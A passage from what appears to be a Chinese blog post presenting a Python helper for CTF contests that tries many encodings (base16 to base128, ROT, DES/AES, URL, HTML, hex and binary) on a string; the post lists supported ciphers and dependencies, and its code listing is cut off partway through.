        <content type="html"><![CDATA[<p>比赛过程中经常遇到不知道编码的解密，于是想到这个挨个尝试一下是何种编码。</p><span id="more"></span><h1 id="1-功能"><a href="#1-功能" class="headerlink" title="1.功能"></a>1.功能</h1><p>目前支持的界面主要包括这些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rot47、rot18、rot13、rot5、des3、aes、des、维吉尼亚密码、莫斯密码、栅栏密码、凯撒密码、图片转base64、base64转成图片、base16、base32、base36、base58、base64、base85,RFC1924型（没什么卵用，就是花里胡哨）、base85,ASCII85型（ctf常用）、base91、base92、base128_2、base128_1、html解码、URL解码、utf-8转码、\xe4\xb8\xad\xe6\x96\x87转中文、字符转成二进制、二进制转成字符、二进制转十六进制、十六进制转二进制</span><br></pre></td></tr></table></figure><p>不支持主要包括这些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brainfuck、ook、MD5、希尔密码、棋盘密码、普莱费尔密码、Keyboard密码、云影密码、简单位移密码、曲路密码、猪圈密码、培根密码、当铺密码、Rabbit加密、跳舞的小人、QWE加密等</span><br></pre></td></tr></table></figure><p>其他解密方式后期可以视情况添加。</p><h1 id="2-需要安装的依赖"><a href="#2-需要安装的依赖" class="headerlink" title="2.需要安装的依赖"></a>2.需要安装的依赖</h1><p>运行版本：python3+下面pip的库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">base64</span><br><span class="line">binascii</span><br><span class="line">html</span><br><span class="line">string</span><br><span class="line">urllib</span><br><span class="line">base128</span><br><span class="line">base36</span><br><span class="line">base58</span><br><span class="line">base91</span><br><span class="line">py3base92</span><br><span class="line">pyDes</span><br><span class="line">Crypto</span><br></pre></td></tr></table></figure><h1 id="3-代码"><a href="#3-代码" class="headerlink" title="3.代码"></a>3.代码</h1><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p><a href="https://github.com/0314Valen/firstdecode">https://github.com/0314Valen/firstdecode</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">import html</span><br><span class="line">import string</span><br><span class="line">import urllib</span><br><span class="line">import urllib.parse</span><br><span class="line">import base128</span><br><span class="line">import base36</span><br><span class="line">import base58</span><br><span class="line">import base91</span><br><span class="line">import py3base92</span><br><span class="line">from pyDes import CBC, des, PAD_PKCS5</span><br><span class="line">import Crypto.Cipher.AES</span><br><span class="line">import Crypto.Random</span><br><span class="line">import Crypto.Cipher.DES3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Cryptoall:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        print(&quot;目前支持解密语言包括:十六进制转二进制,二进制转十六进制,base128,&quot;)</span><br><span class="line">        # self.content=content</span><br><span class="line">        # self.key=keys</span><br><span class="line"></span><br><span class="line">    def six_to_chr(self, content):</span><br><span class="line">        # unhexlify则执行反向操作,HEX转BIN：</span><br><span class="line">        # content = &#x27;61626364&#x27;</span><br><span class="line">        try:</span><br><span class="line">            a = binascii.unhexlify(content)</span><br><span class="line">            print(a)</span><br><span class="line">            print(&quot;输入的16进制转换成字符串完成&quot;)</span><br><span class="line">            return a</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;binascii.unhexlify-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def chr_to_six(self, content):</span><br><span class="line">        # hexlify作用是二进制转十六进制，产生的字串是源数据两倍长度</span><br><span class="line">        # content=binascii.hexlify</span><br><span class="line">        try:</span><br><span class="line">            a = binascii.b2a_hex(bytes(content, &#x27;utf-8&#x27;))</span><br><span class="line">            print(a)</span><br><span class="line">            print(&quot;输入的字符转换成16进制完成&quot;)</span><br><span class="line">            return a</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;binascii.hexlify-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def two_to_chr(self, content):</span><br><span class="line">        # 二进制转字符</span><br><span class="line">        # 011011110011100001000100011011000111100001001011001010110100100000111000011101110111001101101001010110000110010100101111010001010101001001000110011100000100000101001101011000010100001001010000011010010100100101100011011010100011000101110011010010000111100101000111010011110100110101101101010100010100010001101011010010110010101101110101010110000111001101010110010110100110011101110010011001010011010101000100010100110101100001110111001111010011110101101000011010000110100001101000011010000110100001101000011010000110100001101000011010000110100001101000011010000110100001101000</span><br><span class="line">        try:</span><br><span class="line">            a = int(content, 2)</span><br><span class="line">            b = a.to_bytes((a.bit_length() + 7) // 8, &#x27;big&#x27;).decode()</span><br><span class="line">            print(b)</span><br><span class="line">            return b</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;二进制转换ASCII-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def chr_to_two(self, content):</span><br><span class="line">        # 字符转成二进制</span><br><span class="line">        try:</span><br><span class="line">            a = bin(int.from_bytes(content.encode(), &#x27;big&#x27;))</span><br><span class="line">            print(a)</span><br><span class="line">            return False</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;ASCII转换二进制-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def str_to_str(self, content):</span><br><span class="line">        # \xe4\xb8\xad\xe6\x96\x87</span><br><span class="line">        try:</span><br><span class="line">            s = content.encode(&#x27;raw_unicode_escape&#x27;).decode()</span><br><span class="line">            print(s)</span><br><span class="line">            return s</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;转字符-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def Unicode(self, content):</span><br><span class="line">        try:</span><br><span class="line">            # 转为utf-8(明文)</span><br><span class="line">            a = content.encode(&#x27;utf8&#x27;).decode(&#x27;unicode_escape&#x27;)</span><br><span class="line">            print(a)</span><br><span class="line">            # 转为utf-8编码</span><br><span class="line">            b = content.encode(&#x27;utf8&#x27;).decode(&#x27;unicode_escape&#x27;).encode(&#x27;utf8&#x27;)</span><br><span class="line">            print(b)</span><br><span class="line">            return False</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;UnicodeUTF-8解码-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def urldecode(self, content):</span><br><span class="line">        # %E7%BC%96%E7%A0%81</span><br><span class="line">        try:</span><br><span class="line">            str2 = urllib.parse.quote(content)  # 将字符串进行编码</span><br><span class="line">            print(str2)  #</span><br><span class="line">            str3 = urllib.parse.unquote(content)  # 解码字符串</span><br><span class="line">            print(str3)  # str3=url编码</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;URL编码-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def htmlencode(self, content):</span><br><span class="line">        # a=&#x27;&amp;lt;li&amp;gt;&amp;#26085;&amp;#21888;&amp;#21017;&#x27;</span><br><span class="line">        try:</span><br><span class="line">            a = html.unescape(content).encode(&#x27;utf-8&#x27;)</span><br><span class="line">            print(a)</span><br><span class="line">            print(&quot;输入的字符转换成html解密完成&quot;)</span><br><span class="line">            return a</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;html解密-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def b128decode1(self, content):</span><br><span class="line">        # base128解密1</span><br><span class="line">        # m = b128.encode(plain_text.encode(encoding=&quot;utf-8&quot;))  # 加密</span><br><span class="line">        try:</span><br><span class="line">            a = base128.base128.encode((content.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;))</span><br><span class="line">            print(a)</span><br><span class="line">            print(&quot;输入的字符转换成base128解密完成&quot;)</span><br><span class="line">            return a</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;base128第一次-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def b128decode2(self, content):</span><br><span class="line">        # base128解密2</span><br><span class="line">        # b128 = base128.base128(chars = None, chunksize = 7)</span><br><span class="line">        # m = b128.encode(plain_text.encode(encoding=&quot;utf-8&quot;))  # 加密</span><br><span class="line">        # c = b&#x27;&#x27;.join(b128.decode(cipher_text)).decode()   #解密</span><br><span class="line">        try:</span><br><span class="line">            c = b&#x27;&#x27;.join(base128.base128(chars=None, chunksize=7).decode(content)).decode()</span><br><span class="line">            print(c)</span><br><span class="line">            print(&quot;输入的字符转换成base128解密完成&quot;)</span><br><span class="line">            return c</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;base128第二次-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def b92decode(self, content):</span><br><span class="line">        # base92解密</span><br><span class="line">        # m = py3base92.encode(plain_text)  #加密</span><br><span class="line">        # c = py3base92.decode(cipher_text) #解密</span><br><span class="line">        try:</span><br><span class="line">            a = py3base92.b92decode(content.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;)</span><br><span class="line">            print(a)</span><br><span class="line">            print(&quot;输入的字符转换成base91解密完成&quot;)</span><br><span class="line">            return a</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;base92-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def b91decode(self, content):</span><br><span class="line">        # base91解密</span><br><span class="line">        # m = base91.encode(plain_text.encode(&#x27;utf-8&#x27;)) #加密</span><br><span class="line">        # c = base91.decode(cipher_text).decode()       #解密</span><br><span class="line">        try:</span><br><span class="line">            a = base91.encode(content.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;)</span><br><span class="line">            print(a)</span><br><span class="line">            print(&quot;输入的字符转换成base91解密完成&quot;)</span><br><span class="line">            return a</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;base91-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def a85decode(self, content):</span><br><span class="line">        # base85第二次解密，#RFC1924型（没什么卵用，就是花里胡哨）</span><br><span class="line">        # m = base64.b85encode(plain_text.encode(&#x27;utf-8&#x27;)).decode()#加密</span><br><span class="line">        # c = base64.a85decode(cipher_text).decode() #解密</span><br><span class="line">        try:</span><br><span class="line">            a = base64.b85decode(content.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;)</span><br><span class="line">            print(a)</span><br><span class="line">            print(&quot;输入的字符转换成base85解密完成&quot;)</span><br><span class="line">            return a</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;base85-------------------------------第二次解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def b85decode(self, content):</span><br><span class="line">        # base85第一次解密，###ASCII85型（ctf常用）</span><br><span class="line">        # m = base64.a85encode(plain_text.encode(&#x27;utf-8&#x27;)).decode()#加密</span><br><span class="line">        # c = base64.b85decode(cipher_text).decode() #解密</span><br><span class="line">        try:</span><br><span class="line">            a = base64.a85decode(content.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;)</span><br><span class="line">            print(a)</span><br><span class="line">            print(&quot;输入的字符转换成base85解密完成&quot;)</span><br><span class="line">            return a</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;base85-------------------------------第一次解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def b64decode(self, content):</span><br><span class="line">        # base64解密</span><br><span class="line">        # m = base64.b64encode(plain_text.encode(&#x27;utf-8&#x27;)).decode() #加密</span><br><span class="line">        # c = base64.b64decode(cipher_text).decode() #解密</span><br><span class="line">        try:</span><br><span class="line">            a = base64.b64decode(content.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;)</span><br><span class="line">            print(a)</span><br><span class="line">            print(&quot;输入的字符转换成base64解密完成&quot;)</span><br><span class="line">            return a</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;base64-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def b58decode(self, content):</span><br><span class="line">        # base58解密</span><br><span class="line">        # m =  base58.b58encode(plain_text.encode(&#x27;utf-8&#x27;)).decode() #加密</span><br><span class="line">        # c =  base58.b58decode(cipher_text).decode() #解密</span><br><span class="line">        try:</span><br><span class="line">            a = base58.b58decode(content.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;)</span><br><span class="line">            print(a)</span><br><span class="line">            print(&quot;输入的字符转换成base58解密完成&quot;)</span><br><span class="line">            return a</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;base58-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def b36decode(self, content):</span><br><span class="line">        # base36解密</span><br><span class="line">        # c = base36.dumps(int(cipher_text)) #解密</span><br><span class="line">        # m = base36.loads(plain_text)       #加密</span><br><span class="line">        try:</span><br><span class="line">            a = base36.dumps(int(content.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;))</span><br><span class="line">            print(a)</span><br><span class="line">            print(base36.dumps(int(content)))</span><br><span class="line">            print(&quot;输入的字符转换成base36解密完成&quot;)</span><br><span class="line">            return a</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;base36-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def b32decode(self, content):</span><br><span class="line">        # base32解密</span><br><span class="line">        # m = base64.b32decode(cipher_text).decode()  # 解密</span><br><span class="line">        # c = base64.b32encode(plain_text.encode(&#x27;utf-8&#x27;)).decode()  # 加密</span><br><span class="line">        try:</span><br><span class="line">            a = base64.b32decode(content.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;)</span><br><span class="line">            print(a)</span><br><span class="line">            print(&quot;输入的字符转换成base32解密完成&quot;)</span><br><span class="line">            return a</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;base32-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def b16decode(self, content):</span><br><span class="line">        # base16解密</span><br><span class="line">        # c = base64.b16decode(cipher_text)  #加密</span><br><span class="line">        # m = base64.b16encode(plain_text) #解密</span><br><span class="line">        try:</span><br><span class="line">            a = base64.b16decode(content.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;)</span><br><span class="line">            print(a)</span><br><span class="line">            print(&quot;输入的字符转换成base16解密完成&quot;)</span><br><span class="line">            return a</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;base16-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def img_to_base64(self):</span><br><span class="line">        # image转base64</span><br><span class="line">        try:</span><br><span class="line">            with open(r&quot;1.jpg&quot;, &quot;rb&quot;) as f:  # 转为二进制格式</span><br><span class="line">                base64_data = str(base64.b64encode(f.read()), encoding=&#x27;utf-8&#x27;)  # 使用base64进行加密</span><br><span class="line">                print(base64_data)</span><br><span class="line">                file = open(&#x27;1.txt&#x27;, &#x27;wt&#x27;)  # 写成文本格式</span><br><span class="line">                file.write(base64_data)</span><br><span class="line">                file.close()</span><br><span class="line">            return False</span><br><span class="line">        except:</span><br><span class="line">            print(&#x27;image转base64-------------------------------解密失败&#x27;)</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    def base_to_img(self, content):</span><br><span class="line">        # 